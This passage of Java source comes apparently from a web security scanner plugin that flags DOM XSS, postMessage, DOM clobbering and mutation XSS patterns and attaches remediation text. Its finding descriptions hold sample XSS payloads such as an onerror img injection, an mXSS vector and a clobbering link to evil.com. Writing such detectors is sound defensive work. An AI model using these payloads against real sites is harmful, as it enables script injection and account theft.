                                .description("User-controlled input from '" + source
                                        + "' flows into dangerous sink '" + sink + "'."
                                        + (sanitized ? " A sanitizer was detected nearby, reducing risk."
                                        : " No sanitization detected — likely exploitable."))
                                .remediation("Sanitize user input before passing to " + sink
                                        + ". Use DOMPurify.sanitize() for HTML sinks, "
                                        + "encodeURIComponent() for URL sinks, or textContent for safe text insertion.")
                                .requestResponse(reqResp)
                                .responseEvidence(context)
                                .build());

                        reported.add(key);
                        break; // One finding per source-sink pair
                    }
                }
            }
        }
    }

    /**
     * Phase 2: Variable flow tracking.
     * Detects patterns like: var x = location.hash; ... element.innerHTML = x;
     * Supports 2-level chaining: var a = source; var b = a; sink(b);
     */
    private void analyzeVariableFlows(String script, String url, HttpRequestResponse reqResp,
                                       List<Finding> findings, Set<String> reported) {
        // Track variable assignments: var/let/const name = expression;
        Map<String, String> taintedVars = new LinkedHashMap<>(); // varName → source

        // Pass 1: Find variables assigned from DOM sources
        Matcher varMatcher = VAR_ASSIGN_PATTERN.matcher(script);
        while (varMatcher.find()) {
            String varName = varMatcher.group(1);
            String expression = varMatcher.group(2).trim();

            for (String source : DOM_SOURCES_ALL) {
                if (expression.contains(source)) {
                    taintedVars.put(varName, source);
                    break;
                }
            }
        }

        // Also check plain assignments (without var/let/const)
        Matcher assignMatcher = ASSIGN_PATTERN.matcher(script);
        while (assignMatcher.find()) {
            String varName = assignMatcher.group(1);
            String expression = assignMatcher.group(2).trim();

            // Skip if it's a sink assignment (we'll check those below)
            if (varName.contains(".innerHTML") || varName.contains(".outerHTML")) continue;

            for (String source : DOM_SOURCES_ALL) {
                if (expression.contains(source)) {
                    taintedVars.put(varName, source);
                    break;
                }
            }
        }

        // Pass 2: Chain propagation — var b = a (where a is tainted)
        for (int round = 0; round < 3; round++) { // Up to 3 levels of chaining
            Map<String, String> newTainted = new LinkedHashMap<>();
            Matcher chainMatcher = VAR_ASSIGN_PATTERN.matcher(script);
            while (chainMatcher.find()) {
                String varName = chainMatcher.group(1);
                String expression = chainMatcher.group(2).trim();
                if (taintedVars.containsKey(varName)) continue;

                for (String tainted : taintedVars.keySet()) {
                    // Check if the expression uses a tainted variable
                    if (expression.matches(".*\\b" + Pattern.quote(tainted) + "\\b.*")) {
                        newTainted.put(varName, taintedVars.get(tainted) + " → " + tainted);
                        break;
                    }
                }
            }
            if (newTainted.isEmpty()) break;
            taintedVars.putAll(newTainted);
        }

        if (taintedVars.isEmpty()) return;

        // Pass 3: Check if tainted variables appear in sinks
        for (Map.Entry<String, String> entry : taintedVars.entrySet()) {
            String varName = entry.getKey();
            String sourceChain = entry.getValue();

            for (String sink : DOM_SINKS_ALL) {
                String key = "var:" + varName + "|" + sink;
                if (reported.contains(key)) continue;

                // Look for sink usage with the tainted variable
                // Patterns: sink(varName), .innerHTML = varName, $(varName)
                String[] usagePatterns = {
                        sink + varName,                     // eval(varName
                        sink + " " + varName,               // eval( varName
                        sink.replace("(", "\\(") + "\\s*" + Pattern.quote(varName),
                        "\\." + sink.replace(".", "").replace("(", "")
                                + "\\s*\\(\\s*" + Pattern.quote(varName),   // .html(varName)
                        "\\." + sink.replace(".", "").replace("=", "")
                                + "\\s*=\\s*" + Pattern.quote(varName),     // .innerHTML = varName
                };

                boolean found = false;
                for (String pattern : usagePatterns) {
                    try {
                        if (script.contains(sink) && script.matches("(?s).*" + pattern + ".*")) {
                            found = true;
                            break;
                        }
                    } catch (Exception ignored) {
                        // Regex might fail on complex patterns
                        if (script.contains(sink) && script.contains(varName)) {
                            // Fallback: check if both sink and variable are in same function/block
                            found = areSameBlock(script, sink, varName);
                        }
                    }
                }

                if (!found) {
                    // Simple contains check as fallback
                    for (String sinkBase : DOM_SINKS_ALL) {
                        if (script.contains(sinkBase) && script.contains(varName)) {
                            // Check proximity
                            int sinkIdx = script.indexOf(sinkBase);
                            int varIdx = script.indexOf(varName, sinkIdx - 200);
                            if (varIdx >= 0 && Math.abs(varIdx - sinkIdx) < 200) {
                                found = true;
                                break;
                            }
                        }
                    }
                }

                if (found) {
                    boolean sanitized = false;
                    for (String san : SANITIZERS) {
                        if (script.contains(san) && script.contains(varName)) {
                            // Check if sanitizer is applied to this variable
                            int sanIdx = script.indexOf(san);
                            int varIdx = script.indexOf(varName, sanIdx);
                            if (varIdx >= 0 && varIdx - sanIdx < 100) {
                                sanitized = true;
                                break;
                            }
                        }
                    }

                    Severity sev = sanitized ? Severity.LOW : Severity.HIGH;
                    Confidence conf = sanitized ? Confidence.TENTATIVE : Confidence.TENTATIVE;

                    findings.add(Finding.builder("xss-scanner",
                                    "DOM XSS via Variable Flow: " + sourceChain + " → " + varName + " → " + sink
                                            + (sanitized ? " (sanitizer detected)" : ""),
                                    sev, conf)
                            .url(url)
                            .evidence("Source chain: " + sourceChain
                                    + "\nTainted variable: " + varName
                                    + "\nSink: " + sink
                                    + (sanitized ? "\nSanitizer detected nearby" : ""))
                            .description("Data flows from user-controlled source '" + sourceChain
                                    + "' through variable '" + varName + "' into dangerous sink '" + sink
                                    + "'." + (sanitized ? " A sanitizer was detected, but verify it's applied correctly."
                                    : " No sanitization detected in the flow."))
                            .remediation("Sanitize the variable '" + varName + "' before passing to " + sink + ".")
                            .requestResponse(reqResp)
                            .responseEvidence(sink)
                            .build());

                    reported.add(key);
                    break;
                }
            }
        }
    }

    /**
     * Phase 3: jQuery-specific DOM XSS patterns.
     * Detects $(location.hash), $('selector').html(userInput), etc.
     */
    private void analyzeJQueryPatterns(String script, String url, HttpRequestResponse reqResp,
                                        List<Finding> findings, Set<String> reported) {
        // Pattern 1: jQuery selector with DOM source — $(location.hash)
        Matcher jqMatcher = JQUERY_SELECTOR_SOURCE.matcher(script);
        while (jqMatcher.find()) {
            String key = "jquery-selector|" + jqMatcher.group();
            if (reported.contains(key)) continue;

            String context = extractContext(script, jqMatcher.start(), jqMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: jQuery Selector with User Input",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("Pattern: " + jqMatcher.group() + "\nContext:\n" + context)
                    .description("jQuery is called with a DOM source as selector. If the source contains "
                            + "HTML (e.g., location.hash = '#<img src=x onerror=alert(1)>'), jQuery will "
                            + "create and inject the HTML element, leading to XSS.")
                    .remediation("Never pass user-controlled input directly to $(). Use $(document).find() "
                            + "with a sanitized selector, or validate that the input is a valid CSS selector.")
                    .requestResponse(reqResp)
                    .responseEvidence(jqMatcher.group())
                    .build());
            reported.add(key);
        }

        // Pattern 2: String concatenation in jQuery selector with hash/search
        Pattern jqConcat = Pattern.compile(
                "\\$\\(\\s*['\"]\\s*[^'\"]*['\"]\\s*\\+\\s*(?:location\\.|document\\.URL|window\\.name)",
                Pattern.CASE_INSENSITIVE);
        Matcher concatMatcher = jqConcat.matcher(script);
        while (concatMatcher.find()) {
            String key = "jquery-concat|" + concatMatcher.start();
            if (reported.contains(key)) continue;

            String context = extractContext(script, concatMatcher.start(), concatMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: jQuery Selector with Concatenated User Input",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("Pattern: " + concatMatcher.group() + "\nContext:\n" + context)
                    .description("jQuery selector is built by concatenating user-controllable input. "
                            + "An attacker can break out of the selector context and inject HTML.")
                    .remediation("Avoid string concatenation in jQuery selectors. Use .find() or validate input.")
                    .requestResponse(reqResp)
                    .responseEvidence(concatMatcher.group())
                    .build());
            reported.add(key);
        }

        // Pattern 3: .html() / .append() called with DOM source variable
        Pattern jqHtmlSource = Pattern.compile(
                "\\.(html|append|prepend|after|before|replaceWith|wrapAll|wrapInner)\\s*\\(\\s*"
                        + "(?:location\\.|document\\.URL|document\\.referrer|window\\.name|event\\.data|e\\.data)",
                Pattern.CASE_INSENSITIVE);
        Matcher htmlMatcher = jqHtmlSource.matcher(script);
        while (htmlMatcher.find()) {
            String key = "jquery-html|" + htmlMatcher.group();
            if (reported.contains(key)) continue;

            String context = extractContext(script, htmlMatcher.start(), htmlMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: jQuery ." + htmlMatcher.group(1) + "() with User Input",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("Pattern: " + htmlMatcher.group() + "\nContext:\n" + context)
                    .description("jQuery's ." + htmlMatcher.group(1) + "() is called directly with "
                            + "user-controllable input, allowing HTML injection and XSS.")
                    .remediation("Use .text() instead of .html() for text content. Sanitize with "
                            + "DOMPurify.sanitize() before passing to .html().")
                    .requestResponse(reqResp)
                    .responseEvidence(htmlMatcher.group())
                    .build());
            reported.add(key);
        }
    }

    /**
     * Phase 4: postMessage handler analysis.
     * Detects event listeners for 'message' that use event.data in sinks without origin checks.
     */
    private void analyzePostMessageHandlers(String script, String url, HttpRequestResponse reqResp,
                                             List<Finding> findings, Set<String> reported) {
        Matcher pmMatcher = POSTMESSAGE_HANDLER.matcher(script);
        while (pmMatcher.find()) {
            String eventParam = pmMatcher.group(1).trim(); // e.g., "e" or "event" or "msg"
            int handlerStart = pmMatcher.start();

            // Find the handler body (look for matching braces)
            int braceStart = script.indexOf('{', pmMatcher.end());
            if (braceStart < 0) continue;
            String handlerBody = extractFunctionBody(script, braceStart);
            if (handlerBody.isEmpty()) continue;

            // Check for origin validation
            boolean hasOriginCheck = handlerBody.contains(".origin")
                    || handlerBody.contains("event.origin")
                    || handlerBody.contains(eventParam + ".origin");

            // Check if event.data flows into sinks
            String dataAccess = eventParam + ".data";
            boolean dataUsedInSink = false;
            String sinkFound = "";

            for (String sink : DOM_SINKS_ALL) {
                if (handlerBody.contains(sink) && handlerBody.contains(dataAccess)) {
                    dataUsedInSink = true;
                    sinkFound = sink;
                    break;
                }
                // Also check if .data is assigned to a variable that reaches a sink
                if (handlerBody.contains(dataAccess)) {
                    Matcher varM = Pattern.compile("(\\w+)\\s*=\\s*" + Pattern.quote(dataAccess)).matcher(handlerBody);
                    if (varM.find()) {
                        String varName = varM.group(1);
                        if (handlerBody.contains(sink) && handlerBody.contains(varName)) {
                            dataUsedInSink = true;
                            sinkFound = sink + " (via variable '" + varName + "')";
                            break;
                        }
                    }
                }
            }

            if (dataUsedInSink) {
                String key = "postmessage|" + handlerStart;
                if (reported.contains(key)) continue;

                Severity sev = hasOriginCheck ? Severity.MEDIUM : Severity.HIGH;
                String context = extractContext(script, handlerStart,
                        Math.min(script.length(), handlerStart + handlerBody.length() + 100));

                findings.add(Finding.builder("xss-scanner",
                                "DOM XSS via postMessage Handler"
                                        + (hasOriginCheck ? " (origin check present)" : " (NO origin check!)"),
                                sev, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("Handler: addEventListener('message', ...)"
                                + "\nData access: " + dataAccess
                                + "\nSink: " + sinkFound
                                + "\nOrigin check: " + (hasOriginCheck ? "YES" : "NO")
                                + "\nContext:\n" + context)
                        .description("A postMessage event handler receives external data via " + dataAccess
                                + " and passes it to " + sinkFound + "."
                                + (hasOriginCheck ? " An origin check is present, but verify it's correct."
                                : " No origin validation — any page can send messages to this handler."))
                        .remediation("Always validate event.origin against expected domains before processing "
                                + "postMessage data. Sanitize event.data before using in DOM sinks.")
                        .requestResponse(reqResp)
                        .responseEvidence(sinkFound)
                        .build());
                reported.add(key);
            }
        }
    }

    /**
     * Phase 5: eval() and eval-like functions called with DOM sources.
     */
    private void analyzeEvalPatterns(String script, String url, HttpRequestResponse reqResp,
                                      List<Finding> findings, Set<String> reported) {
        // Pattern: eval(location.hash.substring(1))
        for (String execSink : DOM_SINKS_EXEC) {
            int idx = -1;
            while ((idx = script.indexOf(execSink, idx + 1)) >= 0) {
                // Extract the argument (content between parentheses)
                int parenStart = idx + execSink.length();
                if (parenStart >= script.length()) break;
                String arg = extractParenContent(script, idx);
                if (arg.isEmpty()) continue;

                for (String source : DOM_SOURCES_ALL) {
                    if (arg.contains(source)) {
                        String key = "eval|" + execSink + "|" + source;
                        if (reported.contains(key)) continue;

                        String context = extractContext(script, idx, idx + execSink.length() + arg.length());

                        findings.add(Finding.builder("xss-scanner",
                                        "DOM XSS: " + execSink.trim() + " with User Input",
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url)
                                .evidence("Sink: " + execSink.trim() + "\nSource in argument: " + source
                                        + "\nArgument: " + truncate(arg, 200)
                                        + "\nContext:\n" + context)
                                .description("Code execution sink '" + execSink.trim()
                                        + "' is called with user-controllable input from '" + source
                                        + "'. An attacker can execute arbitrary JavaScript.")
                                .remediation("Never pass user input to eval(), Function(), setTimeout(string), "
                                        + "or setInterval(string). Use safer alternatives.")
                                .requestResponse(reqResp)
                                .responseEvidence(execSink.trim() + truncate(arg, 60))
                                .build());
                        reported.add(key);
                        break;
                    }
                }
            }
        }
    }

    /**
     * Phase 6: Dynamic script/iframe loading from user input.
     * Detects createElement('script').src = userInput patterns.
     */
    private void analyzeDynamicLoading(String script, String url, HttpRequestResponse reqResp,
                                        List<Finding> findings, Set<String> reported) {
        // Pattern: createElement('script') ... .src = location.hash
        Pattern createScript = Pattern.compile(
                "createElement\\s*\\(\\s*['\"](?:script|iframe|embed|object)['\"]\\s*\\)",
                Pattern.CASE_INSENSITIVE);
        Matcher csm = createScript.matcher(script);
        while (csm.find()) {
            // Check the surrounding 500 chars for .src = <source>
            int regionEnd = Math.min(script.length(), csm.end() + 500);
            String region = script.substring(csm.start(), regionEnd);

            for (String source : DOM_SOURCES_ALL) {
                if (region.contains(source) && (region.contains(".src") || region.contains(".href"))) {
                    String key = "dynamic-load|" + csm.start() + "|" + source;
                    if (reported.contains(key)) continue;

                    String context = extractContext(script, csm.start(), regionEnd);

                    findings.add(Finding.builder("xss-scanner",
                                    "DOM XSS: Dynamic Script/Iframe Loading from User Input",
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url)
                            .evidence("Pattern: createElement + src/href assignment from " + source
                                    + "\nContext:\n" + context)
                            .description("A script/iframe element is dynamically created and its src is set "
                                    + "from user-controlled input '" + source + "'. An attacker can load "
                                    + "arbitrary JavaScript from an external domain.")
                            .remediation("Never set script.src or iframe.src from user input. Validate URLs "
                                    + "against a whitelist of allowed domains.")
                            .requestResponse(reqResp)
                            .responseEvidence(source)
                            .build());
                    reported.add(key);
                    break;
                }
            }
        }
    }

    /**
     * Phase 7: HTML event handler attributes containing DOM sources.
     * Detects: <div onclick="eval(location.hash)">
     */
    private void analyzeHtmlEventHandlers(String body, String url, HttpRequestResponse reqResp,
                                           List<Finding> findings, Set<String> reported) {
        Matcher ehm = EVENT_HANDLER_ATTR.matcher(body);
        while (ehm.find()) {
            String handlerCode = ehm.group(1);

            for (String source : DOM_SOURCES_ALL) {
                if (handlerCode.contains(source)) {
                    String key = "event-handler|" + ehm.group() + "|" + source;
                    if (reported.contains(key)) continue;

                    // Check if source flows to a dangerous operation
                    boolean dangerous = false;
                    for (String sink : DOM_SINKS_EXEC) {
                        if (handlerCode.contains(sink.replace("(", ""))) {
                            dangerous = true;
                            break;
                        }
                    }
                    for (String sink : DOM_SINKS_HTML) {
                        if (handlerCode.contains(sink.replace("(", "").replace(".", ""))) {
                            dangerous = true;
                            break;
                        }
                    }

                    // The source being in an event handler is dangerous on its own
                    findings.add(Finding.builder("xss-scanner",
                                    "DOM XSS: Event Handler with User Input",
                                    dangerous ? Severity.HIGH : Severity.MEDIUM, Confidence.TENTATIVE)
                            .url(url)
                            .evidence("Event handler: " + truncate(ehm.group(), 150)
                                    + "\nSource: " + source
                                    + "\nDangerous operation: " + (dangerous ? "YES" : "No direct sink found"))
                            .description("An HTML event handler attribute contains user-controllable input "
                                    + "from '" + source + "'." + (dangerous ? " A dangerous operation "
                                    + "was detected in the handler code." : ""))
                            .requestResponse(reqResp)
                            .responseEvidence(truncate(ehm.group(), 150))
                            .build());
                    reported.add(key);
                    break;
                }
            }
        }
    }

    /**
     * Phase 8: javascript: URL schemes containing DOM sources.
     * Detects: <a href="javascript:eval(location.hash)">
     */
    private void analyzeJavaScriptUrls(String body, String url, HttpRequestResponse reqResp,
                                        List<Finding> findings, Set<String> reported) {
        Matcher jsm = JS_URL_SCHEME.matcher(body);
        while (jsm.find()) {
            String jsCode = jsm.group(1);

            for (String source : DOM_SOURCES_ALL) {
                if (jsCode.contains(source)) {
                    String key = "js-url|" + jsm.start() + "|" + source;
                    if (reported.contains(key)) continue;

                    findings.add(Finding.builder("xss-scanner",
                                    "DOM XSS: javascript: URL with User Input",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .evidence("javascript: URL: " + truncate(jsm.group(), 200)
                                    + "\nSource: " + source)
                            .description("A javascript: URL scheme contains user-controllable input from '"
                                    + source + "'. This allows arbitrary code execution when the link is clicked "
                                    + "or element is loaded.")
                            .remediation("Never use javascript: URLs with user input. Use event handlers "
                                    + "and validate all input.")
                            .requestResponse(reqResp)
                            .responseEvidence(truncate(jsm.group(), 200))
                            .build());
                    reported.add(key);
                    break;
                }
            }
        }
    }

    /**
     * Phase 9: Framework-specific DOM XSS patterns in HTML attributes.
     */
    private void analyzeFrameworkAttributes(String body, String url, HttpRequestResponse reqResp,
                                             List<Finding> findings, Set<String> reported) {
        // Vue: v-html with dynamic binding
        Pattern vueVHtml = Pattern.compile("v-html\\s*=\\s*[\"']([^\"']+)[\"']");
        Matcher vuem = vueVHtml.matcher(body);
        while (vuem.find()) {
            String key = "vue-vhtml|" + vuem.start();
            if (reported.contains(key)) continue;

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: Vue v-html Directive",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("v-html binding: " + vuem.group()
                            + "\nExpression: " + vuem.group(1))
                    .description("Vue's v-html directive renders raw HTML without sanitization. If the bound "
                            + "expression '" + vuem.group(1) + "' contains user-controlled data, XSS is possible.")
                    .remediation("Use {{ }} interpolation (auto-escaped) instead of v-html. If HTML rendering "
                            + "is needed, sanitize with DOMPurify first.")
                    .requestResponse(reqResp)
                    .responseEvidence(vuem.group())
                    .build());
            reported.add(key);
        }

        // React: dangerouslySetInnerHTML with dynamic content
        Pattern reactDanger = Pattern.compile(
                "dangerouslySetInnerHTML\\s*=\\s*\\{\\{\\s*__html\\s*:\\s*([^}]{1,300})\\}\\}");
        Matcher reactm = reactDanger.matcher(body);
        while (reactm.find()) {
            String key = "react-danger|" + reactm.start();
            if (reported.contains(key)) continue;

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: React dangerouslySetInnerHTML",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("React: " + truncate(reactm.group(), 200)
                            + "\nContent expression: " + reactm.group(1).trim())
                    .description("React's dangerouslySetInnerHTML renders unescaped HTML. If the content "
                            + "includes user-controlled data, XSS is possible.")
                    .remediation("Avoid dangerouslySetInnerHTML. If needed, sanitize with DOMPurify.sanitize() "
                            + "before passing to __html.")
                    .requestResponse(reqResp)
                    .responseEvidence(truncate(reactm.group(), 200))
                    .build());
            reported.add(key);
        }

        // Angular: bypassSecurityTrust* calls
        Pattern angularBypass = Pattern.compile(
                "bypassSecurityTrust(Html|Script|Url|ResourceUrl|Style)\\s*\\(",
                Pattern.CASE_INSENSITIVE);
        Matcher angm = angularBypass.matcher(body);
        while (angm.find()) {
            String key = "angular-bypass|" + angm.start();
            if (reported.contains(key)) continue;

            findings.add(Finding.builder("xss-scanner",
                            "DOM XSS: Angular Security Bypass — bypassSecurityTrust" + angm.group(1),
                            Severity.HIGH, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Angular bypass: " + angm.group())
                    .description("Angular's DomSanitizer.bypassSecurityTrust" + angm.group(1)
                            + "() disables Angular's built-in XSS protection. If the input contains "
                            + "user-controlled data, XSS is possible.")
                    .remediation("Avoid bypassSecurityTrust* functions. Use Angular's built-in sanitization "
                            + "or sanitize with DOMPurify before bypassing.")
                    .requestResponse(reqResp)
                    .responseEvidence(angm.group())
                    .build());
            reported.add(key);
        }

        // AngularJS: ng-bind-html without $sce
        if (body.contains("ng-bind-html")) {
            Pattern ngBind = Pattern.compile("ng-bind-html\\s*=\\s*[\"']([^\"']+)[\"']");
            Matcher ngm = ngBind.matcher(body);
            while (ngm.find()) {
                String key = "angularjs-bind|" + ngm.start();
                if (reported.contains(key)) continue;

                findings.add(Finding.builder("xss-scanner",
                                "DOM XSS: AngularJS ng-bind-html",
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("ng-bind-html: " + ngm.group()
                                + "\nExpression: " + ngm.group(1))
                        .description("AngularJS ng-bind-html renders HTML content. If the bound expression "
                                + "contains user input, XSS may be possible (especially in AngularJS < 1.6 "
                                + "or with $sce disabled).")
                        .requestResponse(reqResp)
                        .responseEvidence(ngm.group())
                        .build());
                reported.add(key);
            }
        }
    }

    // ==================== PASSIVE: DOM CLOBBERING (Improvement 4) ====================

    /**
     * Phase 10: DOM Clobbering detection.
     * Detects patterns where named DOM element access (getElementById, forms, window.)
     * could be clobbered by attacker-injected HTML elements.
     */
    private void analyzeDomClobbering(String body, String url, HttpRequestResponse reqResp,
                                       List<Finding> findings, Set<String> reported) {
        List<String> scriptBlocks = extractScriptBlocks(body, "text/html");

        for (String script : scriptBlocks) {
            // Pattern 1: getElementById → property access that flows to sink
            Pattern getByIdPattern = Pattern.compile(
                    "document\\.getElementById\\s*\\(\\s*[\"']([^\"']+)[\"']\\s*\\)\\s*(?:\\.|;)");
            Matcher gbiMatcher = getByIdPattern.matcher(script);
            while (gbiMatcher.find()) {
                String elementId = gbiMatcher.group(1);
                int matchEnd = gbiMatcher.end();
                String afterMatch = script.substring(matchEnd - 1,
                        Math.min(script.length(), matchEnd + 200));

                // Check if the element's property flows to a dangerous operation
                for (String sink : DOM_CLOBBERING_SINKS) {
                    if (afterMatch.contains(sink)) {
                        String key = "dom-clobber|getElementById|" + elementId + "|" + sink;
                        if (reported.contains(key)) continue;

                        // Check if the element ID appears in HTML (could be clobbered)
                        boolean idInHtml = body.contains("id=\"" + elementId + "\"")
                                || body.contains("id='" + elementId + "'");

                        String context = extractContext(script, gbiMatcher.start(),
                                Math.min(script.length(), matchEnd + 150));

                        findings.add(Finding.builder("xss-scanner",
                                        "DOM Clobbering: getElementById('" + elementId + "') → " + sink,
                                        Severity.MEDIUM, Confidence.TENTATIVE)
                                .url(url)
                                .evidence("Element ID: " + elementId
                                        + " | Property access: " + sink
                                        + " | ID found in HTML: " + idInHtml
                                        + "\nContext:\n" + context)
                                .description("The code accesses document.getElementById('" + elementId
                                        + "') and uses its '" + sink + "' property. If an attacker can inject "
                                        + "HTML with id=\"" + elementId + "\", they can control the element's "
                                        + "properties (DOM clobbering). For example, injecting "
                                        + "<a id=\"" + elementId + "\" href=\"https://evil.com\"> "
                                        + "would clobber the .href property.")
                                .remediation("Always null-check getElementById results. Validate property "
                                        + "values before use. Use Content-Security-Policy to limit impact.")
                                .requestResponse(reqResp)
                                .responseEvidence("getElementById('" + elementId + "')" + sink)
                                .build());
                        reported.add(key);
                        break;
                    }
                }
            }

            // Pattern 2: document.forms.X or window.X used without null checks
            Pattern namedAccessPattern = Pattern.compile(
                    "(document\\.forms\\.(\\w+)|window\\.(\\w+))\\s*(?:\\.|\\[|;)");
            Matcher namedMatcher = namedAccessPattern.matcher(script);
            while (namedMatcher.find()) {
                String fullAccess = namedMatcher.group(1);
                String accessedName = namedMatcher.group(2) != null
                        ? namedMatcher.group(2) : namedMatcher.group(3);

                // Skip common window properties that can't be clobbered
                if (accessedName != null && Set.of("location", "document", "navigator",
                        "history", "screen", "console", "alert", "confirm", "prompt",
                        "setTimeout", "setInterval", "clearTimeout", "clearInterval",
                        "addEventListener", "removeEventListener", "fetch", "XMLHttpRequest",
                        "JSON", "Math", "Array", "Object", "String", "Number", "Boolean",
                        "Date", "RegExp", "Error", "Promise", "Map", "Set", "undefined",
                        "NaN", "Infinity", "length", "self", "top", "parent", "frames",
                        "opener", "closed", "innerWidth", "innerHeight", "outerWidth",
                        "outerHeight", "pageXOffset", "pageYOffset").contains(accessedName)) {
                    continue;
                }

                String key = "dom-clobber|named|" + fullAccess;
                if (reported.contains(key)) continue;

                // Check if there's a null/typeof check before usage
                String beforeAccess = script.substring(
                        Math.max(0, namedMatcher.start() - 150), namedMatcher.start());
                boolean hasGuard = beforeAccess.contains("typeof " + accessedName)
                        || beforeAccess.contains("if (" + accessedName + ")")
                        || beforeAccess.contains("if(" + accessedName + ")")
                        || beforeAccess.contains(accessedName + " &&")
                        || beforeAccess.contains(accessedName + " !==")
                        || beforeAccess.contains(accessedName + " !=");

                if (!hasGuard) {
                    // Check if the accessed value flows to a sink
                    String afterAccess = script.substring(namedMatcher.end(),
                            Math.min(script.length(), namedMatcher.end() + 300));
                    boolean flowsToSink = false;
                    for (String sink : DOM_SINKS_ALL) {
                        if (afterAccess.contains(sink)) {
                            flowsToSink = true;
                            break;
                        }
                    }

                    if (flowsToSink) {
                        String context = extractContext(script, namedMatcher.start(), namedMatcher.end());

                        findings.add(Finding.builder("xss-scanner",
                                        "DOM Clobbering: " + fullAccess + " without null check",
                                        Severity.MEDIUM, Confidence.TENTATIVE)
                                .url(url)
                                .evidence("Access pattern: " + fullAccess
                                        + " | Null check: NO"
                                        + " | Flows to sink: YES"
                                        + "\nContext:\n" + context)
                                .description("The code accesses '" + fullAccess + "' without a null/typeof "
                                        + "guard and the value flows to a dangerous sink. An attacker who can "
                                        + "inject HTML elements with name=\"" + accessedName + "\" or "
                                        + "id=\"" + accessedName + "\" can shadow this property (DOM clobbering) "
                                        + "and control the value that reaches the sink.")
                                .remediation("Add null/typeof checks before accessing named properties. "
                                        + "Use explicit APIs (e.g., getElementById) instead of implicit "
                                        + "window.X or document.forms.X access.")
                                .requestResponse(reqResp)
                                .responseEvidence(fullAccess)
                                .build());
                        reported.add(key);
                    }
                }
            }
        }
    }

    // ==================== PASSIVE: MUTATION XSS PATTERNS (Improvement 5) ====================

    /**
     * Phase 11: Mutation XSS (mXSS) pattern detection.
     * Detects innerHTML round-trip patterns that cause browser parsing differentials.
     */
    private void analyzeMutationXssPatterns(String script, String url, HttpRequestResponse reqResp,
                                             List<Finding> findings, Set<String> reported) {
        // Pattern 1: innerHTML read-then-write (el1.innerHTML = el2.innerHTML)
        Matcher roundtripMatcher = MXSS_INNERHTML_ROUNDTRIP.matcher(script);
        while (roundtripMatcher.find()) {
            String key = "mxss|innerHTML-roundtrip|" + roundtripMatcher.start();
            if (reported.contains(key)) continue;

            String context = extractContext(script, roundtripMatcher.start(), roundtripMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "Mutation XSS: innerHTML Read-Then-Write",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Pattern: " + roundtripMatcher.group() + "\nContext:\n" + context)
                    .description("innerHTML is read from one element and written to another. "
                            + "Browsers may mutate HTML during the innerHTML getter serialization, "
                            + "creating new attack vectors. For example, `<listing>&lt;img onerror=alert(1)//` "
                            + "can mutate into a valid img tag during innerHTML round-trip.")
                    .remediation("Avoid reading innerHTML and writing it to another element. "
                            + "Use cloneNode(true) for safe DOM copying, or sanitize with DOMPurify "
                            + "after reading innerHTML.")
                    .requestResponse(reqResp)
                    .responseEvidence(roundtripMatcher.group())
                    .build());
            reported.add(key);
        }

        // Pattern 2: Generic innerHTML read followed by write on different variable
        Pattern innerHtmlReadWrite = Pattern.compile(
                "(\\w+)\\s*=\\s*(\\w+)\\.innerHTML[\\s\\S]{0,500}?(\\w+)\\.innerHTML\\s*=\\s*\\1");
        Matcher rwMatcher = innerHtmlReadWrite.matcher(script);
        while (rwMatcher.find()) {
            String key = "mxss|innerHTML-var-roundtrip|" + rwMatcher.start();
            if (reported.contains(key)) continue;

            String context = extractContext(script, rwMatcher.start(), rwMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "Mutation XSS: innerHTML Value Stored and Re-Injected",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Variable '" + rwMatcher.group(1) + "' stores innerHTML from '"
                            + rwMatcher.group(2) + "' and is written to '"
                            + rwMatcher.group(3) + "'.innerHTML"
                            + "\nContext:\n" + context)
                    .description("A variable stores the innerHTML of one element and later assigns it "
                            + "to another element's innerHTML. The browser's HTML serializer may mutate "
                            + "the content during the read (getter) phase, creating parsing differentials "
                            + "that can lead to mXSS.")
                    .remediation("Use textContent for safe text transfer. If HTML transfer is needed, "
                            + "sanitize with DOMPurify.sanitize() between read and write.")
                    .requestResponse(reqResp)
                    .responseEvidence(rwMatcher.group())
                    .build());
            reported.add(key);
        }

        // Pattern 3: DOMParser then innerHTML injection
        if (script.contains("DOMParser") && script.contains(".innerHTML")) {
            Pattern domParserPattern = Pattern.compile(
                    "new\\s+DOMParser\\s*\\(\\s*\\)\\.parseFromString\\s*\\([^)]+\\)");
            Matcher dpMatcher = domParserPattern.matcher(script);
            while (dpMatcher.find()) {
                // Check if innerHTML is used within 500 chars after DOMParser
                int afterIdx = dpMatcher.end();
                String after = script.substring(afterIdx,
                        Math.min(script.length(), afterIdx + 500));
                if (after.contains(".innerHTML")) {
                    String key = "mxss|domparser-innerHTML|" + dpMatcher.start();
                    if (reported.contains(key)) continue;

                    String context = extractContext(script, dpMatcher.start(),
                            afterIdx + after.indexOf(".innerHTML") + 10);

                    findings.add(Finding.builder("xss-scanner",
                                    "Mutation XSS: DOMParser → innerHTML",
                                    Severity.MEDIUM, Confidence.TENTATIVE)
                            .url(url)
                            .evidence("DOMParser output used with innerHTML"
                                    + "\nContext:\n" + context)
                            .description("HTML is parsed with DOMParser and then re-injected via innerHTML. "
                                    + "DOMParser and innerHTML may serialize HTML differently, creating "
                                    + "mutation vectors where safe-looking input becomes dangerous after "
